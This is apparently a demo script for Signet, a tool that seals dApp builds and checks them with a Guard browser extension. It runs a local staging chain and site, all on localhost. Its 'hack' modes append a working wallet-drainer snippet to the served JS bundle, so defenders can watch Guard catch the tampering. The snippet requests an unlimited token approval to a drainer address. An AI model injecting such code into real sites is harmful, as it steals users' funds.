#!/usr/bin/env node
// Try Signet in your own Chrome, on the local staging chain (docs/TRY-IT-LOCALLY.md). Nothing touches mainnet.
//
//   node staging/try-it.mjs setup        seal the demo dApp as swap.localhost, publish it (with a full on-chain copy),
//                                         switch its gate to enforce mode, build the gateway and the Guard extension
//   node staging/try-it.mjs build        rebuild the gateway and Guard for local (2 RPCs + the local gateway) only
//   node staging/try-it.mjs serve        the demo site on http://swap.localhost:4180/, the gateway on :8097, the second RPC on :8546
//   node staging/try-it.mjs hack [once]  the site starts serving a tampered bundle (once = Bybit style: one request only)
//   node staging/try-it.mjs clean        the site serves the sealed build again
//   node staging/try-it.mjs status       what the switch is set to
import http from 'node:http';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, writeFileSync, readdirSync, rmSync, cpSync } from 'node:fs';
import { join, extname } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = fileURLToPath(new URL('..', import.meta.url));
const RUN = join(ROOT, 'staging/.run/try-it');
const PROJECT = join(RUN, 'project');
const DIST = join(PROJECT, 'dist');
const MODE = join(RUN, 'mode');
const DOMAIN = 'swap.localhost';
const SITE_PORT = 4180;
const GATEWAY_PORT = 8097;
const RPC = 'http://127.0.0.1:8545';
const RPC2_PORT = 8546;
// Guard needs two RPCs that must agree. Staging has one node, so (as in the staging tests) the second RPC is a small
// proxy in front of the same anvil, started by `serve`.
const RPC2 = `http://127.0.0.1:${RPC2_PORT}`;
const DRAINER = '0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F';
const TOKEN = '0x1E4a5963aBFD975d8c9021ce480b42188849D41d';
// what the "hacker" appends to the main bundle: on load, ask the wallet to approve the drainer for everything
const DRAIN = `\n;(async()=>{try{const e=window.ethereum;if(!e)return;const [a]=await e.request({method:"eth_requestAccounts"});await e.request({method:"eth_sendTransaction",params:[{from:a,to:"${TOKEN}",data:"0x095ea7b3${DRAINER.slice(2).toLowerCase().padStart(64, '0')}${'f'.repeat(64)}"}]});document.title="DRAINED"}catch(x){console.log("drainer refused: "+x.message)}})();\n`;

const sh = (cmd, args, o = {}) => {
  const r = spawnSync(cmd, args, { cwd: ROOT, encoding: 'utf8', env: { ...process.env, SIGNET_NETWORK: 'local', ...o.env } });
  if (r.status !== 0 && !o.allowFail) {
    console.error(`${cmd} ${args.join(' ')} failed:\n${r.stdout}${r.stderr}`);
    process.exit(1);
  }
  return r;
};
const signet = (args, as) => sh(process.execPath, [join(ROOT, 'packages/cli/src/cli.ts'), '-C', PROJECT, ...(as ? ['--as', as] : []), ...args]).stdout;
const cast = (...args) => sh('cast', [...args, '--rpc-url', RPC]).stdout.trim();
const mode = () => (existsSync(MODE) ? readFileSync(MODE, 'utf8').trim() : 'clean');

function setup() {
  if (sh('cast', ['rpc', 'anvil_nodeInfo', '--rpc-url', RPC], { allowFail: true }).status !== 0) {
    console.error('the staging chain is not running: pnpm staging:up');
    process.exit(1);
  }
  const local = JSON.parse(readFileSync(join(ROOT, 'packages/contracts/deployments/local.json'), 'utf8'));
  const registry = local.contracts.registry;
  const bound = cast('call', registry, 'gateOf(string)(address)', DOMAIN);
  const cfgFile = join(PROJECT, 'signet.config.json');
  const cfg = existsSync(cfgFile) ? JSON.parse(readFileSync(cfgFile, 'utf8')) : null;
  if (cfg && cfg.gate.toLowerCase() === bound.toLowerCase()) console.log(`${DOMAIN} is already sealed on this staging chain (gate ${cfg.gate}).`);
  else {
    if (BigInt(bound) !== 0n) {
      console.error(`${DOMAIN} is bound to a gate this script didn't make (${bound}). Restart staging (pnpm staging:down && pnpm staging:up) and run setup again.`);
      process.exit(1);
    }
    rmSync(PROJECT, { recursive: true, force: true });
    mkdirSync(PROJECT, { recursive: true });
    console.log('1/6 building the demo dApp');
    sh('pnpm', ['--filter', '@signet/demo-dapp', 'build']);
    cpSync(join(ROOT, 'packages/demo-dapp/dist'), DIST, { recursive: true });
    console.log(`2/6 creating ${DOMAIN}'s gate (commit, 2 blocks, reveal)`);
    signet(['init', '--domain', DOMAIN, '--approvers', 'approver1,approver2,approver3', '--recovery', 'recovery', '--guardian', 'guardian', '--no-wait'], 'user1');
    cast('rpc', 'anvil_mine', '0x2');
    signet(['init'], 'user1');
    const c = JSON.parse(readFileSync(cfgFile, 'utf8'));
    writeFileSync(cfgFile, JSON.stringify({ ...c, allowlist: { 196: { spenders: ['0x5FbDB2315678afecb367f032d93F642f64180aa3'] } } }, null, 2)); // the router may be given an allowance
    console.log('3/6 sealing the build');
    signet(['seal', DIST]);
    console.log('4/6 first release: propose, 3 approvals, publish with a full copy on-chain');
    sh('bash', [join(ROOT, 'staging/renew-operator.sh')]);
    const id = signet(['propose', DIST, '--emergency'], 'approver1').match(/Proposed release #(\d+)/)[1];
    signet(['approve', id], 'approver2');
    signet(['approve', id], 'approver3');
    cast('rpc', 'evm_increaseTime', `0x${(86400 + 60).toString(16)}`);
    cast('rpc', 'anvil_mine', '0x1');
    signet(['publish', id, DIST, '--full'], 'user2');
    console.log('5/6 enforce mode (allowed 7 days after the gate was made: the staging clock jumps a week)');
    cast('rpc', 'evm_increaseTime', `0x${(7 * 86400 + 60).toString(16)}`);
    cast('rpc', 'anvil_mine', '0x1');
    sh('cast', ['send', JSON.parse(readFileSync(cfgFile, 'utf8')).gate, 'enforce()', '--from', local.accounts.approvers[0], '--unlocked', '--rpc-url', RPC]);
  }
  // the domain proof: Guard acts on a sealed domain only once the site names its gate in /.well-known/signet.json
  // (docs/domain-ownership.md); without it the demo site stays grey ("not verified") and nothing is refused
  signet(['domain', DIST]);
  console.log('6/6 building the gateway and the Guard extension');
  build();
  writeFileSync(MODE, 'clean\n');
  console.log(`\nReady. Next: node staging/try-it.mjs serve, then load ${join(ROOT, 'packages/extension/dist')} in chrome://extensions`);
}

/// The gateway first (Guard pins the hashes of its files), then Guard: both with the two RPCs and the local gateway.
function build() {
  const env = { SIGNET_RPC_URL: RPC, SIGNET_RPC_URL2: RPC2 };
  const g = sh(process.execPath, [join(ROOT, 'packages/gateway/scripts/build.mjs')], { env });
  const e = sh(process.execPath, [join(ROOT, 'packages/extension/scripts/build.mjs')], { env: { ...env, SIGNET_GATEWAY_URL: `http://localhost:${GATEWAY_PORT}` } });
  console.log(g.stdout.trim());
  console.log(e.stdout.trim());
  console.log(`\nLoad (or reload) this folder in chrome://extensions: ${join(ROOT, 'packages/extension/dist')}`);
}

async function serve() {
  if (!existsSync(DIST)) {
    console.error('run setup first: node staging/try-it.mjs setup');
    process.exit(1);
  }
  const types = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml' };
  const main = `assets/${readdirSync(join(DIST, 'assets')).find((f) => /^index-.*\.js$/.test(f))}`;
  http.createServer((req, res) => {
    const path = req.url.split('?')[0];
    const rel = path === '/' || !extname(path) ? 'index.html' : path.slice(1);
    const file = join(DIST, rel);
    if (rel.includes('..') || rel.startsWith('signet') || !existsSync(file)) return void ((res.statusCode = 404), res.end());
    let body = readFileSync(file);
    const m = mode();
    if (rel === main && m !== 'clean') {
      body = Buffer.concat([body, Buffer.from(DRAIN)]);
      if (m === 'once') writeFileSync(MODE, 'clean\n'); // served once, then the "attacker" swaps it back
      console.log(`[${new Date().toLocaleTimeString()}] served a TAMPERED ${rel}${m === 'once' ? ' (once; clean again from now on)' : ''}`);
    }
    res.setHeader('content-type', types[extname(rel)] ?? 'application/octet-stream');
    res.setHeader('cache-control', 'no-cache'); // revalidated every time, so switching modes shows on the next reload
    res.end(body);
  }).listen(SITE_PORT, '127.0.0.1');
  // the second RPC: forwards every JSON-RPC request to the same anvil
  http.createServer(async (req, res) => {
    res.setHeader('access-control-allow-origin', '*');
    res.setHeader('access-control-allow-headers', '*');
    if (req.method !== 'POST') return void res.end();
    const chunks = [];
    for await (const c of req) chunks.push(c);
    try {
      const up = await fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' }, body: Buffer.concat(chunks) });
      res.setHeader('content-type', 'application/json');
      res.end(Buffer.from(await up.arrayBuffer()));
    } catch {
      res.statusCode = 502;
      res.end();
    }
  }).listen(RPC2_PORT, '127.0.0.1');
  const { serveGateway } = await import(join(ROOT, 'packages/gateway/scripts/serve.mjs'));
  await serveGateway(join(ROOT, 'packages/gateway/dist'), GATEWAY_PORT);
  console.log(`second RPC     ${RPC2}  ->  ${RPC}`);
  console.log(`demo site      http://${DOMAIN}:${SITE_PORT}/      (now: ${mode()})`);
  console.log(`verified copy  http://${DOMAIN.replace(/-/g, '--').replace(/\./g, '-')}.localhost:${GATEWAY_PORT}/`);
  console.log('switch:        node staging/try-it.mjs hack | hack once | clean      (Ctrl+C stops these servers)');
}

const [cmd, arg] = process.argv.slice(2);
if (cmd === 'setup') setup();
else if (cmd === 'build') build();
else if (cmd === 'serve') await serve();
else if (cmd === 'hack') {
  writeFileSync(MODE, arg === 'once' ? 'once\n' : 'hacked\n');
  console.log(arg === 'once' ? 'HACKED for the next request of the main bundle only, then clean again (the Bybit pattern). Reload the page.' : 'HACKED: the site now serves a tampered bundle that asks your wallet to approve a drainer. Reload the page.');
} else if (cmd === 'clean') {
  writeFileSync(MODE, 'clean\n');
  console.log('CLEAN: the site serves the sealed build again. Reload the page.');
} else if (cmd === 'status') console.log(`the demo site is ${mode()}`);
else {
  console.error('usage: node staging/try-it.mjs setup | build | serve | hack [once] | clean | status');
  process.exit(1);
}
